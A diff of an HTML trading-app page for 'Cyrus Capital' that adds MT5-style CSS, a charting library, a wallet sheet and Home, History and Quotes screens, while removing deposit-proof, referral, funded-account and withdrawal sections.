@@ -40,6 +40,7 @@
     <div id="loginPage">
         <script src="https://cdn.tailwindcss.com">
         </script>
+        <script src="https://unpkg.com/lightweight-charts@4.1.3/dist/lightweight-charts.standalone.production.js"></script>
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
         <style>
@@ -1793,6 +1794,74 @@ localStorage.setItem('cyrus_registered_account', JSON.stringify({
             border-color: #0f172a;
             box-shadow: 0 4px 12px rgba(15, 23, 42, 0.2);
         }
+        /* ── MT5-STYLE SCREENS (white/yellow): Home / Trade / History / Quote ── */
+        .mt-dark-section { background:#fff; min-height:100vh; color:#0f172a; padding-bottom:100px; }
+        .mt-topbar { display:flex; align-items:center; gap:14px; padding:18px 20px 14px; }
+        .mt-hamburger { background:none; border:none; cursor:pointer; display:flex; flex-direction:column; gap:5px; padding:6px; flex-shrink:0; }
+        .mt-hamburger span { width:20px; height:2px; background:#0f172a; display:block; border-radius:2px; }
+        .mt-topbar-title { font-size:19px; font-weight:800; flex:1; color:#0f172a; }
+        .mt-icon-btn { background:none; border:none; color:#0f172a; font-size:18px; cursor:pointer; padding:6px; opacity:0.85; }
+
+        .mt-balance-list { padding:8px 20px 0; }
+        .mt-balance-row { display:flex; align-items:baseline; gap:8px; padding:16px 0; border-bottom:1px solid #f1f5f9; }
+        .mt-balance-label { font-weight:700; font-size:15px; color:#0f172a; flex-shrink:0; }
+        .mt-balance-dots { flex:1; border-bottom:2px dotted #cbd5e1; height:0; align-self:center; margin-bottom:6px; }
+        .mt-balance-value { font-weight:800; font-size:17px; color:#0f172a; flex-shrink:0; font-variant-numeric:tabular-nums; }
+
+        .mt-symbol-scroller { display:flex; gap:8px; padding:12px 16px; overflow-x:auto; scrollbar-width:none; border-bottom:1px solid #f1f5f9; }
+        .mt-symbol-scroller::-webkit-scrollbar { display:none; }
+        .mt-symbol-chip { flex-shrink:0; padding:8px 14px; border-radius:100px; background:#f8fafc; color:#64748b; font-size:11px; font-weight:800; border:1px solid #e2e8f0; cursor:pointer; white-space:nowrap; }
+        .mt-symbol-chip.active { background:#D4AF37; color:#000; border-color:#D4AF37; }
+
+        .mt-price-header { padding:12px 16px 4px; }
+        .mt-price-header .sym { font-size:14px; font-weight:800; color:#0f172a; }
+        .mt-price-header .name { font-size:11px; color:#94a3b8; font-weight:600; margin-top:1px; }
+
+        .mt-chart-wrap { padding:4px 4px 0; }
+
+        .mt-order-bar { display:flex; align-items:stretch; gap:0; margin:14px 16px 6px; border-radius:14px; overflow:hidden; }
+        .mt-sell-btn, .mt-buy-btn { flex:1; padding:16px 10px; text-align:center; background:#3b82f6; color:#fff; border:none; cursor:pointer; transition:background 0.3s; }
+        .mt-sell-btn.tick-down, .mt-buy-btn.tick-down { background:#ef4444; }
+        .mt-sell-btn .lbl, .mt-buy-btn .lbl { display:block; font-size:10px; font-weight:800; text-transform:uppercase; letter-spacing:0.1em; opacity:0.9; }
+        .mt-sell-btn .px, .mt-buy-btn .px { display:block; font-size:17px; font-weight:900; margin-top:2px; font-variant-numeric:tabular-nums; }
+        .mt-lots-box { width:76px; flex-shrink:0; background:#f8fafc; padding:14px 4px; text-align:center; border-top:1px solid #f1f5f9; border-bottom:1px solid #f1f5f9; }
+        .mt-lots-box label { display:block; font-size:8px; font-weight:800; color:#94a3b8; text-transform:uppercase; letter-spacing:0.08em; margin-bottom:2px; }
+        .mt-lots-box input { width:100%; background:none; border:none; color:#0f172a; text-align:center; font-weight:800; font-size:13px; outline:none; }
+        .mt-order-note { text-align:center; color:#94a3b8; font-size:9px; font-weight:600; padding:0 20px 16px; }
+
+        .mt-subnav { display:flex; border-bottom:1px solid #f1f5f9; }
+        .mt-subnav-btn { flex:1; padding:14px 6px; background:none; border:none; font-size:11px; font-weight:800; text-transform:uppercase; letter-spacing:0.05em; color:#94a3b8; cursor:pointer; border-bottom:2px solid transparent; }
+        .mt-subnav-btn.active { color:#0f172a; border-bottom-color:#D4AF37; }
+        .mt-badge { display:inline-block; background:#D4AF37; color:#000; font-size:9px; font-weight:900; padding:1px 6px; border-radius:100px; margin-left:2px; }
+        .mt-badge.hidden { display:none; }
+        .mt-view.hidden { display:none; }
+
+        .mt-summary { padding:10px 20px 4px; }
+        .mt-summary-row { display:flex; justify-content:space-between; padding:9px 0; border-bottom:1px solid #f8fafc; font-size:13px; }
+        .mt-summary-row .lbl { color:#94a3b8; font-weight:700; }
+        .mt-summary-row .val { font-weight:800; font-variant-numeric:tabular-nums; color:#0f172a; }
+
+        .mt-row { display:flex; justify-content:space-between; align-items:center; padding:14px 20px; border-bottom:1px solid #f8fafc; cursor:pointer; }
+        .mt-row:active { background:#fafaf8; }
+        .mt-row-sym { font-size:14px; font-weight:800; color:#0f172a; }
+        .mt-row-name { font-size:11px; color:#94a3b8; font-weight:600; margin-top:1px; }
+        .mt-row-right { text-align:right; }
+        .mt-row-price { font-size:15px; font-weight:800; font-variant-numeric:tabular-nums; }
+        .mt-row-sub { font-size:10px; font-weight:700; margin-top:2px; }
+        .mt-up { color:#3b82f6; }
+        .mt-down { color:#ef4444; }
+        .mt-close-btn { margin-top:6px; padding:6px 14px; background:#0f172a; border:none; color:#fff; border-radius:100px; font-size:10px; font-weight:800; text-transform:uppercase; cursor:pointer; }
+        .mt-empty { text-align:center; color:#94a3b8; font-size:12px; font-weight:700; padding:60px 20px; }
+
+        /* ── WALLET BOTTOM SHEET ── */
+        .wallet-sheet-backdrop { position:fixed; inset:0; background:rgba(15,23,42,0.4); z-index:9990; opacity:0; pointer-events:none; transition:opacity 0.25s; }
+        .wallet-sheet-backdrop.show { opacity:1; pointer-events:auto; }
+        .wallet-sheet { position:fixed; left:0; right:0; bottom:0; background:#fff; border-radius:24px 24px 0 0; box-shadow:0 -10px 40px rgba(0,0,0,0.15); z-index:9991; padding:10px 20px 28px; transform:translateY(100%); transition:transform 0.3s ease; }
+        .wallet-sheet.show { transform:translateY(0); }
+        .wallet-sheet-handle { width:40px; height:4px; background:#e2e8f0; border-radius:4px; margin:6px auto 18px; }
+        .wallet-sheet-btn { width:100%; padding:16px; border-radius:14px; font-weight:900; font-size:12px; text-transform:uppercase; letter-spacing:0.05em; border:none; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:10px; margin-bottom:12px; }
+        .wallet-sheet-btn.deposit { background:#D4AF37; color:#000; }
+        .wallet-sheet-btn.withdraw { background:#f8fafc; color:#0f172a; border:1px solid #e2e8f0; margin-bottom:0; }
         .naira-tab-btn:not(.active) {
             background: white;
             color: #94a3b8;
@@ -2531,408 +2600,95 @@ localStorage.setItem('cyrus_registered_account', JSON.stringify({
     </div>
 </div>
 
-<!-- DEPOSIT PROOF SUBMISSION MODAL -->
-<div id="deposit-proof-modal" class="modal-overlay">
-    <div class="modal-card" style="max-height:90vh; overflow-y:auto;">
-        <button onclick="closeDepositProof()"
-        class="absolute top-5 right-5 text-slate-400 font-bold text-2xl z-10">✕</button>
-        <div class="p-6 pb-0">
-            <div class="w-14 h-14 bg-yellow-100 text-yellow-600 rounded-2xl flex items-center justify-center mb-4">
-                <i class="fa-solid fa-receipt text-2xl"></i>
-            </div>
-            <h3 class="text-2xl font-black text-slate-900 mb-1">Submit Deposit Proof</h3>
-            <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-5">Once deposit is confirmed
-            your balance will be updated instantly or  within 1-15 minutes, contact support if deposit verification takes longer</p>
-        </div>
-        <div class="px-6 pb-6 space-y-4">
-            <div>
-                <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1 mb-2 block">Payment
-                    ID <span class="text-red-400">*</span></label>
-                    <input type="text" id="proof-payment-id" placeholder="e.g. 5548635191abc..."
-                    class="w-full p-4 bg-slate-50 rounded-2xl font-bold text-sm outline-none border-2 border-transparent focus:border-yellow-400 transition-colors">
-                    <p class="text-[9px] font-bold text-slate-400 ml-1 mt-1">Copy from NowPayments → More Details</p>
-                </div>
-                <div>
-                    <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1 mb-2 block">Amount
-                        Paid (USD) <span class="text-red-400">*</span></label>
-                        <input type="number" id="proof-amount" placeholder="e.g. 10" min="1"
-                        class="w-full p-4 bg-slate-50 rounded-2xl font-bold text-sm outline-none border-2 border-transparent focus:border-yellow-400 transition-colors">
-                    </div>
-                    <div>
-                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1 mb-2 block">Payment
-                        Screenshot (Optional)</label>
-                        <div id="proof-upload-zone" class="proof-upload-zone"
-                        onclick="document.getElementById('proof-screenshot-input').click()">
-                        <input type="file" id="proof-screenshot-input" class="hidden" accept="image/*"
-                        onchange="handleProofScreenshot(this)">
-                        <div id="proof-upload-ui">
-                            <div class="h-10 w-10 bg-white rounded-full flex items-center justify-center mx-auto mb-2 shadow-sm">
-                                <i class="fa-solid fa-camera text-yellow-500"></i>
-                            </div>
-                            <p class="text-[11px] font-black text-slate-600 uppercase">Tap to Upload Screenshot</p>
-                            <p class="text-[9px] font-bold text-slate-400 mt-1">JPG / PNG — helps speed up verification</p>
-                        </div>
-                    </div>
-                </div>
-                <button id="proof-submit-btn" onclick="submitDepositProof()"
-                class="w-full py-5 bg-slate-900 text-white rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl active:scale-95 transition-transform mt-2 flex items-center justify-center gap-2">
-                <i class="fa-solid fa-paper-plane"></i> Submit for Verification
-            </button>
-            <p class="text-[9px] font-bold text-slate-400 text-center">Balance will be credited within 15 minutes after
-            payment verification. Contact support if deposit takes longer</p>
-        </div>
-        <div class="h-2 bg-yellow-400 w-full"></div>
-    </div>
-</div>
-
 <!-- ═══ HOME SECTION ═══ -->
-<section id="home" class="page-section active px-6 pt-8">
-<header style="display:flex; justify-content:space-between; align-items:center; margin-bottom:24px; background:rgba(255,255,255,0.7); backdrop-filter:blur(16px); -webkit-backdrop-filter:blur(16px); border:1px solid rgba(212,175,55,0.15); border-radius:24px; padding:14px 18px; box-shadow:0 4px 20px rgba(212,175,55,0.06);">
-    <button onclick="openDrawer()" style="width:42px; height:42px; background:linear-gradient(135deg,#0f172a,#1e293b); border:none; border-radius:14px; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:5px; cursor:pointer; flex-shrink:0; box-shadow:0 4px 12px rgba(15,23,42,0.2);">
-        <span style="width:18px; height:2px; background:#D4AF37; border-radius:2px; display:block;"></span>
-        <span style="width:14px; height:2px; background:rgba(212,175,55,0.6); border-radius:2px; display:block;"></span>
-        <span style="width:18px; height:2px; background:#D4AF37; border-radius:2px; display:block;"></span>
-    </button>
-    <div style="flex:1; padding:0 14px;">
-        <h1 id="user-greeting" style="font-size:20px; font-weight:900; color:#0f172a; margin:0; line-height:1.2;">Hello, ...</h1>
-        <p style="font-size:9px; color:#94a3b8; font-weight:700; text-transform:uppercase; letter-spacing:0.15em; margin:0;">Welcome to Cyrus Capital</p>
-    </div>
-    <div style="display:flex; gap:8px; align-items:center;">
-        <div class="notif-container">
-            <button onclick="openAlerts()" style="height:42px; width:42px; background:rgba(255,255,255,0.8); border:1px solid rgba(212,175,55,0.2); border-radius:14px; display:flex; align-items:center; justify-content:center; cursor:pointer; color:#0f172a; box-shadow:0 2px 8px rgba(0,0,0,0.04);">
-                <i class="fa-solid fa-bell" style="font-size:18px;"></i>
-            </button>
-            <div id="red-dot" class="red-dot"></div>
-        </div>
-        <button onclick="switchTab('kyc')" style="height:42px; width:42px; background:rgba(212,175,55,0.1); border:1px solid rgba(212,175,55,0.25); border-radius:14px; display:flex; align-items:center; justify-content:center; cursor:pointer; color:#D4AF37;">
-            <i class="fa-solid fa-user-shield" style="font-size:18px;"></i>
-        </button>
+<section id="home" class="page-section active mt-dark-section">
+<header class="mt-topbar">
+    <button onclick="openDrawer()" class="mt-hamburger"><span></span><span></span><span></span></button>
+    <h1 class="mt-topbar-title">Home</h1>
+    <button onclick="openWalletSheet()" class="mt-icon-btn" title="Wallet"><i class="fa-solid fa-wallet"></i></button>
+    <div class="notif-container">
+        <button onclick="openAlerts()" class="mt-icon-btn"><i class="fa-solid fa-bell"></i></button>
+        <div id="red-dot" class="red-dot"></div>
     </div>
 </header>
 
-
-<div id="kyc-banner" class="hidden mb-4 px-2">
-    <div id="kyc-banner-inner" class="rounded-2xl p-4 flex items-center gap-3">
-        <i id="kyc-banner-icon" class="fa-solid fa-triangle-exclamation text-lg"></i>
-        <div>
-            <p id="kyc-banner-text" class="text-xs font-black"></p>
-            <p id="kyc-banner-sub" class="text-[10px] font-bold opacity-70"></p>
-        </div>
-        <button onclick="switchTab('kyc')"
-        class="ml-auto text-[10px] font-black uppercase underline whitespace-nowrap">Fix Now</button>
+<div class="mt-balance-list">
+    <div class="mt-balance-row">
+        <span class="mt-balance-label">Balance:</span>
+        <span class="mt-balance-dots"></span>
+        <span id="mt-home-balance" class="mt-balance-value">$0.00</span>
     </div>
-</div>
-
-<div class="wallet-container mb-10">
-    <div class="wallet-card">
-        <div class="bg-white p-8 rounded-[2.5rem] border border-slate-100 shadow-sm text-slate-900 h-full">
-            <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-2 opacity-80">Deposit Balance | please swipe 👉</p>
-            <p id="live-balance" class="text-5xl font-black">$0.00</p>
-            <div class="flex gap-4 mt-10">
-                <button onclick="switchTab('payments')"
-                class="w-full bg-yellow-400 text-black py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest">Deposit
-            Cash</button>
-        </div>
+    <div class="mt-balance-row">
+        <span class="mt-balance-label">Equity:</span>
+        <span class="mt-balance-dots"></span>
+        <span id="mt-home-equity" class="mt-balance-value">$0.00</span>
     </div>
-</div>
-<div class="wallet-card">
-    <div class="bg-slate-900 p-8 rounded-[2.5rem] shadow-2xl text-white h-full relative overflow-hidden">
-        <p class="text-[10px] font-black text-yellow-400 uppercase tracking-widest mb-2 opacity-80">Withdrawable Profit |
-        please swipe 👈</p>
-        <p id="live-profit" class="text-5xl font-black">$0.00</p>
-        <div class="flex gap-4 mt-10">
-            <button onclick="openConvert()"
-            class="w-full border-2 border-slate-700 text-white py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest">Convert
-        Profit to cash</button>
-    </div>
-</div>
-</div>
-</div>
-
-<div class="px-2 mb-6">
-    <div class="bg-white p-5 rounded-3xl border border-slate-100 shadow-sm relative">
-        <div class="flex justify-between items-start mb-4">
-            <div class="flex-1 min-w-0 pr-3">
-                <h3 class="text-xs font-black text-slate-400 uppercase tracking-[2px] mb-1">Referral Link</h3>
-                <div class="flex items-center gap-2">
-                    <input type="text" id="ref-link" value="---" readonly
-                    class="text-[11px] font-black text-slate-700 bg-transparent border-none p-0 outline-none w-full truncate">
-                    <button onclick="copyRef()" class="text-yellow-500 text-xs flex-shrink-0"><i
-                    class="fa-solid fa-copy"></i></button>
-                </div>
-            </div>
-            <button onclick="openReferralHistory()"
-            class="bg-slate-900 text-white h-8 w-8 rounded-full flex items-center justify-center shadow-lg active:scale-90 transition-transform flex-shrink-0"
-            title="Earnings History">
-            <i class="fa-solid fa-arrow-right text-xs"></i>
-        </button>
-    </div>
-    <div class="h-[1px] bg-slate-50 w-full mb-3"></div>
-    <button onclick="openReferralNetwork()"
-    class="w-full py-3 bg-slate-900 text-white rounded-xl font-black text-[10px] uppercase tracking-widest shadow-lg active:scale-95 transition-transform flex items-center justify-center gap-2 mb-3">
-    <i class="fa-solid fa-users text-yellow-400"></i> My Referral Network
-</button>
-<p class="text-[10px] font-bold text-slate-500 italic">Earn up to 15% Commission on your referrals deposit</p>
-</div>
-</div>
-<!-- PARTNER LEVEL CARD -->
-<div class="px-2 mb-6">
-    <div onclick="openPartnerModal()" style="background:linear-gradient(135deg,#0f172a,#1a1200); border-radius:24px; padding:20px; border:2px solid rgba(212,175,55,0.25); cursor:pointer; position:relative; overflow:hidden;">
-        <div style="position:absolute;top:-30px;right:-30px;width:120px;height:120px;background:rgba(212,175,55,0.04);border-radius:50%;"></div>
-        <div style="display:flex;align-items:center;justify-content:space-between;gap:12px;">
-            <div style="display:flex;align-items:center;gap:14px;">
-                <div id="home-partner-icon" style="width:48px;height:48px;border-radius:14px;background:rgba(212,175,55,0.15);display:flex;align-items:center;justify-content:center;flex-shrink:0;">
-                    <i class="fa-solid fa-medal" style="color:#D4AF37;font-size:22px;"></i>
-                </div>
-                <div>
-                    <p style="font-size:9px;font-weight:800;color:#D4AF37;text-transform:uppercase;letter-spacing:0.2em;margin-bottom:3px;">Partner Program</p>
-                    <p id="home-partner-level-name" style="font-size:16px;font-weight:900;color:white;line-height:1.2;">Bronze Partner</p>
-                    <p id="home-partner-commission" style="font-size:11px;color:#94a3b8;font-weight:600;margin-top:2px;">5% commission on referral deposits</p>
-                </div>
-            </div>
-            <div style="text-align:right;flex-shrink:0;">
-                <p id="home-partner-pct" style="font-size:24px;font-weight:900;color:#D4AF37;">5%</p>
-                <p style="font-size:9px;font-weight:700;color:#64748b;text-transform:uppercase;">Commission</p>
-            </div>
-        </div>
-        <!-- Progress to next level -->
-        <div id="home-partner-progress-wrap" style="margin-top:14px;">
-            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
-                <p id="home-partner-progress-label" style="font-size:10px;font-weight:700;color:#64748b;">Progress to Silver</p>
-                <p id="home-partner-progress-pct" style="font-size:10px;font-weight:800;color:#D4AF37;">0%</p>
-            </div>
-            <div style="height:4px;background:rgba(255,255,255,0.08);border-radius:4px;overflow:hidden;">
-                <div id="home-partner-progress-bar" style="height:100%;background:linear-gradient(90deg,#D4AF37,#f5c842);border-radius:4px;width:0%;transition:width 0.5s ease;"></div>
-            </div>
-        </div>
-    </div>
-</div>
-<!-- CONTEST BANNER CARD -->
-<a href="/referralcontest" target="_blank" class="block mb-6 px-2">
-    <div class="relative rounded-3xl overflow-hidden shadow-lg" style="background:linear-gradient(135deg, #0a0a0f, #1a1000);">
-        <img src="https://i.postimg.cc/j5z6wyDZ/file-0000000007fc720abf11ef5f5d937b1c.png" 
-             alt="Referral Contest" 
-             class="w-full object-cover" style="max-height:160px; opacity:0.85;">
-        <div class="absolute inset-0 flex flex-col justify-end p-4"
-             style="background:linear-gradient(transparent, rgba(0,0,0,0.85));">
-            <p class="text-yellow-400 font-black text-xs uppercase tracking-widest mb-1">🏆 Referral Contest</p>
-            <p class="text-white font-black text-lg leading-tight">Win up to $500<br>Funded Account!</p>
-            <p class="text-slate-300 font-bold text-xs mt-1">Ends June 13 · Tap to join →</p>
-        </div>
-    </div>
-</a>
-
-<h3 class="text-xs font-black text-slate-400 uppercase tracking-widest mb-4 ml-2">Funded Accounts</h3>
-<div class="space-y-3 pb-10">
-    <div class="bg-white p-5 rounded-2xl border border-slate-100 flex justify-between items-center shadow-sm">
-        <div><p class="font-bold text-slate-800">$50 Account</p><p class="text-[10px] text-slate-400">Fee: $1</p></div>
-        <button onclick="triggerBuy('$50 Account',1)" class="text-yellow-600 font-black text-xs px-5 py-2.5 bg-yellow-50 rounded-xl">BUY</button>
-    </div>
-    <div class="bg-white p-5 rounded-2xl border border-slate-100 flex justify-between items-center shadow-sm">
-        <div><p class="font-bold text-slate-800">$100 Account</p><p class="text-[10px] text-slate-400">Fee: $2</p></div>
-        <button onclick="triggerBuy('$100 Account',2)" class="text-yellow-600 font-black text-xs px-5 py-2.5 bg-yellow-50 rounded-xl">BUY</button>
-    </div>
-    <div class="bg-white p-5 rounded-2xl border border-slate-100 flex justify-between items-center shadow-sm">
-        <div><p class="font-bold text-slate-800">$200 Account</p><p class="text-[10px] text-slate-400">Fee: $4</p></div>
-        <button onclick="triggerBuy('$200 Account',4)" class="text-yellow-600 font-black text-xs px-5 py-2.5 bg-yellow-50 rounded-xl">BUY</button>
-    </div>
-    <div class="bg-white p-5 rounded-2xl border border-slate-100 flex justify-between items-center shadow-sm">
-        <div><p class="font-bold text-slate-800">$300 Account</p><p class="text-[10px] text-slate-400">Fee: $6</p></div>
-        <button onclick="triggerBuy('$300 Account',6)" class="text-yellow-600 font-black text-xs px-5 py-2.5 bg-yellow-50 rounded-xl">BUY</button>
-    </div>
-    <div class="bg-white p-5 rounded-2xl border border-slate-100 flex justify-between items-center shadow-sm">
-        <div><p class="font-bold text-slate-800">$400 Account</p><p class="text-[10px] text-slate-400">Fee: $8</p></div>
-        <button onclick="triggerBuy('$400 Account',8)" class="text-yellow-600 font-black text-xs px-5 py-2.5 bg-yellow-50 rounded-xl">BUY</button>
-    </div>
-    <div class="bg-white p-5 rounded-2xl border border-slate-100 flex justify-between items-center shadow-sm">
-        <div><p class="font-bold text-slate-800">$500 Account</p><p class="text-[10px] text-slate-400">Fee: $10</p></div>
-        <button onclick="triggerBuy('$500 Account',10)" class="text-yellow-600 font-black text-xs px-5 py-2.5 bg-yellow-50 rounded-xl">BUY</button>
-    </div>
-    <div class="bg-white p-5 rounded-2xl border border-slate-100 flex justify-between items-center shadow-sm">
-        <div><p class="font-bold text-slate-800">$1,000 Account</p><p class="text-[10px] text-slate-400">Fee: $20</p></div>
-        <button onclick="triggerBuy('$1,000 Account',20)" class="text-yellow-600 font-black text-xs px-5 py-2.5 bg-yellow-50 rounded-xl">BUY</button>
-    </div>
-    <div class="bg-white p-5 rounded-2xl border border-slate-100 flex justify-between items-center shadow-sm">
-        <div><p class="font-bold text-slate-800">$5,000 Account</p><p class="text-[10px] text-slate-400">Fee: $100</p></div>
-        <button onclick="triggerBuy('$5,000 Account',100)" class="text-yellow-600 font-black text-xs px-5 py-2.5 bg-yellow-50 rounded-xl">BUY</button>
-    </div>
-    <div class="bg-white p-5 rounded-2xl border border-slate-100 flex justify-between items-center shadow-sm">
-        <div><p class="font-bold text-slate-800">$10,000 Account</p><p class="text-[10px] text-slate-400">Fee: $200</p></div>
-        <button onclick="triggerBuy('$10,000 Account',200)" class="text-yellow-600 font-black text-xs px-5 py-2.5 bg-yellow-50 rounded-xl">BUY</button>
-    </div>
-</div>
-
-<!-- My Referrals section removed - using Referral Network modal instead -->
-</section>
-
-<!-- ═══ WITHDRAWAL SECTION ═══ -->
-<section id="withdrawal" class="page-section px-6 pt-10 h-full overflow-y-auto">
-    <div class="flex justify-between items-center mb-6">
-        <h2 class="text-2xl font-black">Withdraw Profit</h2>
-        <button onclick="switchTab('history')"
-        class="h-10 w-10 bg-white rounded-full shadow-sm flex items-center justify-center text-slate-400">
-        <i class="fa-solid fa-clock-rotate-left"></i>
-    </button>
-</div>
-<div id="withdraw-kyc-banner"
-class="hidden mb-5 p-4 rounded-2xl border-2 border-yellow-300 bg-yellow-50 flex items-center gap-3">
-<i class="fa-solid fa-shield-halved text-yellow-500 text-xl"></i>
-<div>
-    <p class="font-black text-slate-800 text-xs">KYC Verification Required</p>
-    <p id="withdraw-kyc-status-text" class="text-[10px] font-bold text-slate-500">Your current status: <span
-        id="withdraw-kyc-label" class="uppercase text-yellow-600">Unverified</span></p>
-    </div>
-    <button onclick="switchTab('kyc')"
-    class="ml-auto text-xs font-black text-slate-800 underline">Verify</button>
-</div>
-<div class="space-y-6 pb-20">
-    <div class="bg-white p-8 rounded-[2.5rem] border border-slate-100 shadow-sm relative">
-        <h3 class="font-black text-slate-800 mb-6 flex items-center gap-2"><i
-            class="fa-solid fa-building-columns text-slate-400"></i> Naira Payout</h3>
-            <div class="space-y-4">
-                <div class="bg-slate-50 p-4 rounded-2xl">
-                    <p class="text-[10px] font-black uppercase text-slate-400 mb-1">Amount to withdraw</p>
-                    <input type="number" id="withdraw-input-ngn" placeholder="Enter USD Amount"
-                    class="w-full bg-transparent border-0 font-bold text-lg outline-none"
-                    oninput="updateNairaCalc(this.value)">
-                    <p class="text-[10px] text-slate-500 font-bold mt-2">$1 = N1,350</p>
-                </div>
-                <div class="p-4 bg-yellow-50 rounded-2xl flex justify-between items-center">
-                    <span class="text-xs font-black uppercase">Auto-Calc:</span>
-                    <span class="font-mono font-black text-yellow-700" id="naira-display">N0.00</span>
-                </div>
-                <div class="relative">
-                    <p class="text-[10px] font-black text-slate-400 uppercase ml-2 mb-1">Bank Account</p>
-                    <input type="text" id="bank-input" onkeyup="filterBanks()" onfocus="showBanks()"
-                    placeholder="Search Nigerian banks..."
-                    class="w-full p-4 bg-slate-50 border-0 rounded-2xl text-sm font-bold focus:ring-2 focus:ring-yellow-400 outline-none">
-                    <div id="bank-list" class="bank-dropdown"></div>
-                </div>
-                <div>
-                    <p class="text-[10px] font-black text-slate-400 uppercase ml-2 mb-1">Account Number</p>
-                    <input type="number" id="ngn-acc-num" placeholder="Enter 10-digit number"
-                    class="w-full p-4 bg-slate-50 border-0 rounded-2xl text-sm font-bold focus:ring-2 focus:ring-yellow-400 outline-none">
-                </div>
-                <div>
-                    <p class="text-[10px] font-black text-slate-400 uppercase ml-2 mb-1">Account Name</p>
-                    <input type="text" id="ngn-acc-name" placeholder="Full name on account"
-                    class="w-full p-4 bg-slate-50 border-0 rounded-2xl text-sm font-bold focus:ring-2 focus:ring-yellow-400 outline-none">
-                </div>
-                <button onclick="checkKycStatus(this)"
-                class="w-full py-5 bg-slate-900 text-white rounded-2xl font-black text-xs uppercase tracking-widest mt-4 flex items-center justify-center gap-2">
-                <i class="fa-solid fa-money-bill-1-wave"></i> Withdraw Now
-            </button>
-        </div>
-    </div>
-    <div class="bg-slate-900 p-8 rounded-[2.5rem] shadow-xl relative text-white">
-        <h3 class="font-black text-yellow-400 mb-6 flex items-center gap-2"><i
-            class="fa-solid fa-money-bill-trend-up"></i> USD$ Crypto</h3>
-            <div class="space-y-4">
-                <div>
-                    <p class="text-[10px] font-black text-slate-400 uppercase ml-2 mb-1">Wallet Address (TON)</p>
-                    <input type="text" id="crypto-address" placeholder="Enter your TON address"
-                    class="w-full p-4 bg-slate-800 border-0 rounded-2xl text-sm font-bold text-white focus:ring-2 focus:ring-yellow-400 outline-none">
-                </div>
-                <div>
-                    <p class="text-[10px] font-black text-slate-400 uppercase ml-2 mb-1">Amount (USD)</p>
-                    <input type="number" id="crypto-amount" placeholder="Enter USD amount"
-                    class="w-full p-4 bg-slate-800 border-0 rounded-2xl text-sm font-bold text-white focus:ring-2 focus:ring-yellow-400 outline-none">
-                </div>
-                <button onclick="checkKycStatus(this)"
-                class="w-full py-5 bg-yellow-400 text-black rounded-2xl font-black text-xs uppercase tracking-widest mt-4 flex items-center justify-center gap-2">
-                <i class="fa-solid fa-coins"></i> Withdraw USDT
-            </button>
-        </div>
+    <div class="mt-balance-row">
+        <span class="mt-balance-label">Free margin:</span>
+        <span class="mt-balance-dots"></span>
+        <span id="mt-home-margin" class="mt-balance-value">$0.00</span>
     </div>
 </div>
 </section>
+
+<div id="wallet-sheet-backdrop" class="wallet-sheet-backdrop" onclick="closeWalletSheet()"></div>
+<div id="wallet-sheet" class="wallet-sheet">
+    <div class="wallet-sheet-handle"></div>
+    <button onclick="closeWalletSheet(); switchTab('payments'); switchPaymentsView('deposit');" class="wallet-sheet-btn deposit"><i class="fa-solid fa-arrow-down"></i> Deposit</button>
+    <button onclick="closeWalletSheet(); switchTab('payments'); switchPaymentsView('withdraw');" class="wallet-sheet-btn withdraw"><i class="fa-solid fa-arrow-up"></i> Withdraw</button>
+</div>
 
 <!-- ═══ HISTORY SECTION ═══ -->
-<section id="history" class="page-section px-6 pt-10 h-full overflow-y-auto">
-    <header class="flex items-center gap-4 mb-5">
-        <button onclick="switchTab('withdrawal')" class="text-slate-400 text-xl"><i
-        class="fa-solid fa-arrow-left"></i></button>
-        <h2 class="text-2xl font-black">Transaction History</h2>
-    </header>
-    <div class="flex gap-2 overflow-x-auto pb-3 mb-4 scrollbar-none" style="scrollbar-width:none;">
-        <button class="filter-tab active" onclick="filterHistory('all', this)">All</button>
-        <button class="filter-tab" onclick="filterHistory('Deposit', this)">Deposits</button>
-        <button class="filter-tab" onclick="filterHistory('Withdrawal', this)">Withdrawals</button>
-        <button class="filter-tab" onclick="filterHistory('Account Purchase', this)">Purchases</button>
-        <button class="filter-tab" onclick="filterHistory('Profit Conversion', this)">Conversions</button>
-        <button class="filter-tab" onclick="filterHistory('Referral Bonus', this)">Referrals</button>
-    </div>
-    <div id="history-list" class="pb-20">
-        <p class="text-center text-slate-400 font-bold text-xs mt-10">No transactions found.</p>
-    </div>
+<section id="history" class="page-section mt-dark-section">
+<header class="mt-topbar">
+    <button onclick="openDrawer()" class="mt-hamburger"><span></span><span></span><span></span></button>
+    <h1 class="mt-topbar-title">History</h1>
+</header>
+
+<div class="mt-subnav">
+    <button class="mt-subnav-btn active" onclick="switchHistoryView('positions', this)">Positions <span id="mt-positions-count" class="mt-badge hidden">0</span></button>
+    <button class="mt-subnav-btn" onclick="switchHistoryView('orders', this)">Orders</button>
+    <button class="mt-subnav-btn" onclick="switchHistoryView('deals', this)">Deals</button>
+</div>
+
+<div id="mt-view-positions" class="mt-view">
+    <div id="mt-positions-list"><p class="mt-empty">No open positions.</p></div>
+</div>
+
+<div id="mt-view-orders" class="mt-view hidden">
+    <p class="mt-empty">No pending orders.</p>
+</div>
+
+<div id="mt-view-deals" class="mt-view hidden">
+    <div class="mt-summary" id="mt-deals-summary"></div>
+    <div id="mt-deals-list"><p class="mt-empty">No deals yet.</p></div>
+</div>
+</section>
+
+<!-- ═══ QUOTE SECTION ═══ -->
+<section id="quote" class="page-section mt-dark-section">
+<header class="mt-topbar">
+    <button onclick="openDrawer()" class="mt-hamburger"><span></span><span></span><span></span></button>
+    <h1 class="mt-topbar-title">Quotes</h1>
+</header>
+<div id="mt-quotes-list"><p class="mt-empty">Loading prices...</p></div>
 </section>
 
 <!-- ═══ PAYMENTS SECTION ═══ -->
